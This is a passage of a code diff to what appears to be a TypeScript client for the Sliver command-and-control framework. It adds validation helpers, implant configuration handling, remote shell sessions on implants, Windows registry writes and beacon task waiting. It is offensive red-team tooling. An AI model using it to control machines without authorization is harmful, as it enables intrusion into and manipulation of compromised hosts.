+              ),
+            );
+          } catch {
+            throw new Error("Unable to resize shell session");
+          }
+        },
+        close: () => closeManagedTunnel(true),
+      };
+    } catch {
+      // The Shell RPC can lose its response after the implant has already
+      // spawned the child. Once a tunnel exists, mirror the canonical client
+      // and attempt a bounded graceful exit before revoking the transport.
+      await closeManagedTunnel(Boolean(tunnelId));
+      throw new Error("Unable to start shell session");
+    }
+  }
+
   interactSession(sessionId: string): InteractiveSession {
     if (!this.tunnels) {
       throw new Error("SliverClient is not connected");
     }
-    return new InteractiveSession(this.rpc, this.tunnels, sessionId);
+    const responseArtifactRpc = this.rpcClients["workbench-artifact"] ?? this.artifactRpc;
+    return new InteractiveSession(this.rpc, this.artifactRpc, responseArtifactRpc, this.tunnels, sessionId);
   }
 
   interactBeacon(beaconId: string): InteractiveBeacon {
-    return new InteractiveBeacon(this.rpc, this.taskResult$, beaconId);
+    return new InteractiveBeacon(this.rpc, this.artifactRpc, this.taskContentRpc, this.taskResult$, beaconId);
   }
 
   async rmBeacon(beaconId: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<void> {
-    await withTimeoutSignal(timeoutSeconds, (signal) => this.rpc.rmBeacon({ ID: beaconId } as Beacon, { signal }));
+    await withTimeoutSignal(timeoutSeconds, (signal) => this.rpc.rmBeacon({ ID: beaconId }, { signal }));
+  }
+}
+
+function assertNonEmptyString(value: string, label: string): void {
+  if (typeof value !== "string" || !value.trim()) throw new Error(`${label} must not be empty`);
+}
+
+function assertBoundedString(value: string, label: string, maxCharacters: number): void {
+  if (typeof value !== "string") throw new Error(`${label} must be a string`);
+  if (value.length > maxCharacters) {
+    throw new Error(`${label} must not exceed ${maxCharacters} characters`);
+  }
+}
+
+function assertBoundedNonEmptyString(value: string, label: string, maxCharacters: number): void {
+  assertNonEmptyString(value, label);
+  assertBoundedString(value, label, maxCharacters);
+}
+
+function assertCredentialSecret(value: string, label: string): void {
+  if (typeof value !== "string") throw new Error(`${label} must be a string`);
+  if (Buffer.byteLength(value, "utf8") > CREDENTIAL_SECRET_MAX_BYTES) {
+    throw new Error(`${label} must not exceed ${CREDENTIAL_SECRET_MAX_BYTES} bytes`);
+  }
+}
+
+function boundedUint32(value: number, label: string): number {
+  if (!Number.isSafeInteger(value) || value < 0 || value > 0xffff_ffff) {
+    throw new Error(`${label} must be an unsigned 32-bit integer`);
+  }
+  return value;
+}
+
+function boundedInt32(value: number, label: string): number {
+  if (!Number.isSafeInteger(value) || value < 0 || value > 0x7fff_ffff) {
+    throw new Error(`${label} must be a non-negative 32-bit integer`);
+  }
+  return value;
+}
+
+function boundedPort(value: number, label: string): number {
+  if (!Number.isSafeInteger(value) || value < 1 || value > 65_535) {
+    throw new Error(`${label} must be between 1 and 65535`);
+  }
+  return value;
+}
+
+function m4StringArray(values: string[] | undefined): string[] {
+  if (values === undefined) return [];
+  if (!Array.isArray(values) || values.some((value) => typeof value !== "string")) {
+    throw new Error("Arguments must be an array of strings");
+  }
+  return [...values];
+}
+
+function m4Environment(env: Readonly<Record<string, string>> | undefined): Record<string, string> {
+  if (env === undefined) return {};
+  const result: Record<string, string> = {};
+  for (const [name, value] of Object.entries(env)) {
+    assertNonEmptyString(name, "Environment variable name");
+    if (typeof value !== "string") throw new Error("Environment variable values must be strings");
+    result[name] = value;
+  }
+  return result;
+}
+
+function m4ArtifactCopy(data: Buffer | undefined, label: string): Buffer {
+  if (data === undefined) return Buffer.alloc(0);
+  if (!Buffer.isBuffer(data)) throw new Error(`${label} must be bytes`);
+  assertBoundedArtifact(data, label);
+  return Buffer.from(data);
+}
+
+function m4SecretCopy(data: Buffer | undefined, label: string): Buffer {
+  if (data === undefined) return Buffer.alloc(0);
+  if (!Buffer.isBuffer(data)) throw new Error(`${label} must be bytes`);
+  if (data.length > M4_SECRET_MAX_PAYLOAD_BYTES) {
+    throw new Error(`${label} exceeds the ${M4_SECRET_MAX_PAYLOAD_BYTES}-byte secret limit`);
+  }
+  return Buffer.from(data);
+}
+
+class ProtobufSizeWriter {
+  byteLength = 0;
+
+  constructor(private readonly parent?: ProtobufSizeWriter) {}
+
+  private add(bytes: number): void {
+    this.byteLength += bytes;
+    if (this.byteLength > M4_IMPLANT_CONFIG_MAX_BYTES) {
+      throw new Error(`Implant configuration exceeds the ${M4_IMPLANT_CONFIG_MAX_BYTES}-byte target-operation limit`);
+    }
+  }
+
+  private addUnsigned(value: bigint): void {
+    do {
+      this.add(1);
+      value >>= 7n;
+    } while (value !== 0n);
+  }
+
+  uint32(value: number): this {
+    this.addUnsigned(BigInt(value >>> 0));
+    return this;
+  }
+
+  int32(value: number): this {
+    if (value < 0) this.add(10);
+    else this.addUnsigned(BigInt(value >>> 0));
+    return this;
+  }
+
+  int64(value: string | number | bigint): this {
+    const integer = BigInt(value);
+    if (integer < 0n) this.add(10);
+    else this.addUnsigned(integer);
+    return this;
+  }
+
+  bool(_value: boolean): this {
+    this.add(1);
+    return this;
+  }
+
+  string(value: string): this {
+    const length = Buffer.byteLength(value);
+    this.addUnsigned(BigInt(length));
+    this.add(length);
+    return this;
+  }
+
+  bytes(value: Uint8Array): this {
+    this.addUnsigned(BigInt(value.byteLength));
+    this.add(value.byteLength);
+    return this;
+  }
+
+  fork(): ProtobufSizeWriter {
+    return new ProtobufSizeWriter(this);
+  }
+
+  join(): ProtobufSizeWriter {
+    if (!this.parent) throw new Error("Cannot join a root protobuf size writer");
+    this.parent.addUnsigned(BigInt(this.byteLength));
+    this.parent.add(this.byteLength);
+    return this.parent;
+  }
+}
+
+function assertM4RepeatedField(value: unknown, label: string, maxItems: number): asserts value is unknown[] {
+  if (!Array.isArray(value)) throw new Error(`${label} must be an array`);
+  if (value.length > maxItems) throw new Error(`${label} must not contain more than ${maxItems} items`);
+}
+
+function m4ImplantConfig(config: ImplantConfig): { value: ImplantConfig; dispose: () => void } {
+  if (!config || typeof config !== "object") throw new Error("Implant configuration is required");
+  assertM4RepeatedField(config.Assets, "Implant configuration assets", M4_IMPLANT_CONFIG_MAX_ASSETS);
+  assertM4RepeatedField(config.C2, "Implant configuration C2 endpoints", M4_IMPLANT_CONFIG_MAX_C2);
+  assertM4RepeatedField(
+    config.CanaryDomains,
+    "Implant configuration canary domains",
+    M4_IMPLANT_CONFIG_MAX_CANARY_DOMAINS,
+  );
+  assertM4RepeatedField(config.exports, "Implant configuration exports", M4_IMPLANT_CONFIG_MAX_EXPORTS);
+  assertM4RepeatedField(
+    config.TrafficEncoders,
+    "Implant configuration traffic encoders",
+    M4_IMPLANT_CONFIG_MAX_TRAFFIC_ENCODERS,
+  );
+
+  for (const [index, asset] of config.Assets.entries()) {
+    if (!asset || typeof asset !== "object" || !Buffer.isBuffer(asset.Data)) {
+      throw new Error(`Implant configuration asset ${index + 1} must contain bytes`);
+    }
+  }
+
+  const preflightValue: ImplantConfig = {
+    ...config,
+    ImplantBuilds: [],
+    HTTPC2ConfigName: config.HTTPC2ConfigName || "default",
+  };
+  const preflight = new ProtobufSizeWriter();
+  ImplantConfig.encode(
+    preflightValue,
+    preflight as unknown as Parameters<typeof ImplantConfig.encode>[1],
+  );
+  if (preflight.byteLength > M4_IMPLANT_CONFIG_MAX_BYTES) {
+    throw new Error(`Implant configuration exceeds the ${M4_IMPLANT_CONFIG_MAX_BYTES}-byte target-operation limit`);
+  }
+
+  const assets: ImplantConfig["Assets"] = [];
+  const dispose = () => {
+    for (const asset of assets) asset.Data.fill(0);
+  };
+
+  try {
+    for (const asset of config.Assets) {
+      assets.push({ ...asset, Data: Buffer.from(asset.Data) });
+    }
+
+    const value: ImplantConfig = {
+      ...config,
+      // ImplantBuilds contains server-generated key material and historical
+      // build metadata. It is not generation input and must not cross these
+      // target-operation RPCs.
+      ImplantBuilds: [],
+      C2: config.C2.map((c2) => ({ ...c2 })),
+      CanaryDomains: [...config.CanaryDomains],
+      exports: [...config.exports],
+      ShellcodeConfig: config.ShellcodeConfig === undefined ? undefined : { ...config.ShellcodeConfig },
+      TrafficEncoders: [...config.TrafficEncoders],
+      Assets: assets,
+      HTTPC2ConfigName: config.HTTPC2ConfigName || "default",
+    };
+
+    const encoded = ImplantConfig.encode(value).finish();
+    try {
+      if (encoded.byteLength !== preflight.byteLength) {
+        throw new Error("Implant configuration protobuf size changed while taking ownership");
+      }
+    } finally {
+      encoded.fill(0);
+    }
+
+    return { value, dispose };
+  } catch (error) {
+    dispose();
+    throw error;
+  }
+}
+
+function isWindowsLogonType(value: number): value is WindowsLogonType {
+  return value === 2 || value === 3 || value === 4 || value === 5 || value === 7 || value === 8 || value === 9;
+}
+
+function shellTerminalDimension(value: number, label: string): number {
+  if (!Number.isSafeInteger(value) || value < 1 || value > SHELL_TERMINAL_DIMENSION_MAX) {
+    throw new Error(`${label} must be between 1 and ${SHELL_TERMINAL_DIMENSION_MAX}`);
+  }
+  return value;
+}
+
+function shellOutputBufferBytes(value: number | undefined): number {
+  if (value === undefined) return SHELL_OUTPUT_BUFFER_DEFAULT_BYTES;
+  if (!Number.isSafeInteger(value) || value < 1) {
+    throw new Error("Shell output buffer must be a positive safe integer");
+  }
+  return Math.min(value, SHELL_OUTPUT_BUFFER_MAX_BYTES);
+}
+
+function shellWriteBytes(value: Uint8Array | string): Buffer {
+  if (typeof value === "string") {
+    if (Buffer.byteLength(value) > SHELL_WRITE_MAX_BYTES) {
+      throw new Error(`Shell write must not exceed ${SHELL_WRITE_MAX_BYTES} bytes`);
+    }
+    return Buffer.from(value);
+  }
+  if (!(value instanceof Uint8Array)) throw new Error("Shell write must be bytes or text");
+  if (value.byteLength > SHELL_WRITE_MAX_BYTES) {
+    throw new Error(`Shell write must not exceed ${SHELL_WRITE_MAX_BYTES} bytes`);
+  }
+  return Buffer.from(value);
+}
+
+function boundedNonNegativeInteger(value: number, label: string): number {
+  if (!Number.isSafeInteger(value) || value < 0) {
+    throw new Error(`${label} must be a non-negative safe integer`);
+  }
+  return value;
+}
+
+function boundedPositiveInteger(value: number, label: string): number {
+  if (!Number.isSafeInteger(value) || value <= 0) {
+    throw new Error(`${label} must be a positive safe integer`);
+  }
+  return value;
+}
+
+function boundedPositiveInt32(value: number, label: string): number {
+  const integer = boundedPositiveInteger(value, label);
+  if (integer > 2_147_483_647) {
+    throw new Error(`${label} must not exceed 2147483647`);
+  }
+  return integer;
+}
+
+function boundedNonNegativeInt32(value: number, label: string): number {
+  const integer = boundedNonNegativeInteger(value, label);
+  if (integer > 2_147_483_647) {
+    throw new Error(`${label} must not exceed 2147483647`);
+  }
+  return integer;
+}
+
+function boundedArtifactByteCount(value = WORKBENCH_ARTIFACT_MAX_PAYLOAD_BYTES): number {
+  const bytes = boundedPositiveInteger(value, "Artifact byte limit");
+  if (bytes > WORKBENCH_ARTIFACT_MAX_PAYLOAD_BYTES) {
+    throw new Error(`Artifact byte limit exceeds ${WORKBENCH_ARTIFACT_MAX_PAYLOAD_BYTES} bytes`);
+  }
+  return bytes;
+}
+
+function assertBoundedArtifact(data: Buffer, label: string, maxBytes = WORKBENCH_ARTIFACT_MAX_PAYLOAD_BYTES): void {
+  const boundedMaxBytes = boundedArtifactByteCount(maxBytes);
+  if (data.length > boundedMaxBytes) {
+    throw new Error(`${label} exceeds the ${boundedMaxBytes}-byte workbench limit`);
+  }
+}
+
+function assertImplantResponse(error: string | undefined, label: string): void {
+  if (error) throw new Error(`${label} was rejected by the target`);
+}
+
+async function decodeBoundedArtifact(
+  data: Buffer,
+  encoder: string,
+  maxBytes: number,
+  label: string,
+): Promise<Buffer> {
+  const boundedMaxBytes = boundedArtifactByteCount(maxBytes);
+  if (encoder === "") {
+    assertBoundedArtifact(data, label, boundedMaxBytes);
+    return data;
+  }
+  return decodeBoundedEncodedBytes(data, encoder, boundedMaxBytes, label);
+}
+
+async function decodeBoundedEncodedBytes(
+  data: Buffer,
+  encoder: string,
+  maxBytes: number,
+  label: string,
+): Promise<Buffer> {
+  const boundedMaxBytes = boundedPositiveInteger(maxBytes, `${label} decoded byte limit`);
+  if (encoder === "") {
+    if (data.length > boundedMaxBytes) {
+      data.fill(0);
+      throw new Error(`${label} exceeds the ${boundedMaxBytes}-byte decoded limit`);
+    }
+    return data;
+  }
+  if (encoder !== "gzip") {
+    data.fill(0);
+    throw new Error(`${label} uses an unsupported artifact encoding`);
+  }
+
+  let decoded: Buffer | undefined;
+  try {
+    decoded = await gunzipBounded(data, boundedMaxBytes);
+    return decoded;
+  } catch (error) {
+    decoded?.fill(0);
+    throw new Error(`${label} exceeds the ${boundedMaxBytes}-byte decoded limit or is invalid gzip`);
+  } finally {
+    data.fill(0);
+  }
+}
+
+function gunzipBounded(data: Buffer, maxOutputLength: number): Promise<Buffer> {
+  return new Promise((resolve, reject) => {
+    const decoder = createGunzip();
+    const chunks: Buffer[] = [];
+    let decodedBytes = 0;
+    let settled = false;
+
+    const clearChunks = () => {
+      for (const chunk of chunks.splice(0, chunks.length)) chunk.fill(0);
+      decodedBytes = 0;
+    };
+    const fail = (error: unknown) => {
+      if (settled) return;
+      settled = true;
+      clearChunks();
+      decoder.destroy();
+      reject(error);
+    };
+
+    decoder.on("data", (value: Buffer) => {
+      if (settled) {
+        value.fill(0);
+        return;
+      }
+      if (value.length > maxOutputLength - decodedBytes) {
+        value.fill(0);
+        fail(new Error("Decoded gzip output exceeds its reviewed limit"));
+        return;
+      }
+      chunks.push(value);
+      decodedBytes += value.length;
+    });
+    decoder.once("error", fail);
+    decoder.once("end", () => {
+      if (settled) return;
+      settled = true;
+      try {
+        const result = Buffer.concat(chunks, decodedBytes);
+        clearChunks();
+        resolve(result);
+      } catch (error) {
+        clearChunks();
+        reject(error);
+      }
+    });
+    decoder.once("close", () => {
+      if (!settled) fail(new Error("Gzip decoder closed before completing"));
+    });
+
+    try {
+      decoder.end(data);
+    } catch (error) {
+      fail(error);
+    }
+  });
+}
+
+function registryWriteFields(value: SessionRegistryWriteValue): {
+  StringValue: string;
+  ByteValue: Buffer;
+  DWordValue: number;
+  QWordValue: string;
+  Type: RegistryType;
+} {
+  switch (value.type) {
+    case "binary":
+      if (!Buffer.isBuffer(value.value)) throw new Error("Registry binary value must be bytes");
+      if (value.value.length > REGISTRY_VALUE_MAX_BYTES) {
+        throw new Error(`Registry binary value exceeds the ${REGISTRY_VALUE_MAX_BYTES}-byte control limit`);
+      }
+      return {
+        StringValue: "",
+        ByteValue: Buffer.from(value.value),
+        DWordValue: 0,
+        QWordValue: "0",
+        Type: RegistryType.Binary,
+      };
+    case "string":
+      if (typeof value.value !== "string") throw new Error("Registry string value must be text");
+      if (Buffer.byteLength(value.value) > REGISTRY_VALUE_MAX_BYTES) {
+        throw new Error(`Registry string value exceeds the ${REGISTRY_VALUE_MAX_BYTES}-byte control limit`);
+      }
+      return {
+        StringValue: value.value,
+        ByteValue: Buffer.alloc(0),
+        DWordValue: 0,
+        QWordValue: "0",
+        Type: RegistryType.String,
+      };
+    case "dword":
+      if (!Number.isInteger(value.value) || value.value < 0 || value.value > 0xffff_ffff) {
+        throw new Error("Registry DWORD value must be an unsigned 32-bit integer");
+      }
+      return {
+        StringValue: "",
+        ByteValue: Buffer.alloc(0),
+        DWordValue: value.value,
+        QWordValue: "0",
+        Type: RegistryType.DWORD,
+      };
+    case "qword":
+      if (!/^\d+$/u.test(value.value) || BigInt(value.value) > 0xffff_ffff_ffff_ffffn) {
+        throw new Error("Registry QWORD value must be an unsigned 64-bit decimal integer");
+      }
+      return {
+        StringValue: "",
+        ByteValue: Buffer.alloc(0),
+        DWordValue: 0,
+        QWordValue: value.value,
+        Type: RegistryType.QWORD,
+      };
   }
 }
 
@@ -916,32 +3588,43 @@ function abortableDelay(delayMs: number, signal: AbortSignal): Promise<void> {
 }
 
 async function waitForBeaconTask(taskResult$: Observable<Event>, taskId: string, timeoutSeconds: number) {
+  const validatedTimeoutSeconds = validateTimeoutSeconds(timeoutSeconds);
   return new Promise<BeaconTask>((resolve, reject) => {
-    const timeoutMs = Math.floor(timeoutSeconds * 1000);
-    const timer = setTimeout(() => {
-      sub.unsubscribe();
-      reject(new Error(`Timeout waiting for beacon task result: ${taskId}`));
-    }, timeoutMs);
+    let settled = false;
+    let unsubscribePending = false;
+    let sub: { unsubscribe(): void } | undefined;
+    const timer = validatedTimeoutSeconds === 0
+      ? undefined
+      : setTimeout(() => {
+          finish(() => reject(new Error(`Timeout waiting for beacon task result: ${taskId}`)));
+        }, validatedTimeoutSeconds * 1_000);
 
-    const sub = taskResult$.subscribe({
+    const finish = (settle: () => void) => {
+      if (settled) return;
+      settled = true;
+      if (timer !== undefined) clearTimeout(timer);
+      if (sub) {
+        sub.unsubscribe();
+      } else {
+        unsubscribePending = true;
+      }
+      settle();
+    };
+
+    sub = taskResult$.subscribe({
       next: (event) => {
         try {
           const task = BeaconTask.decode(event.Data);
           if (task.ID !== taskId) return;
-          clearTimeout(timer);
-          sub.unsubscribe();
-          resolve(task);
+          finish(() => resolve(task));
         } catch (err) {
-          clearTimeout(timer);
-          sub.unsubscribe();
-          reject(err);
+          finish(() => reject(err));
         }
       },
       error: (err) => {
-        clearTimeout(timer);
-        sub.unsubscribe();
-        reject(err);
+        finish(() => reject(err));
       },
     });
+    if (unsubscribePending) sub.unsubscribe();
   });
 }
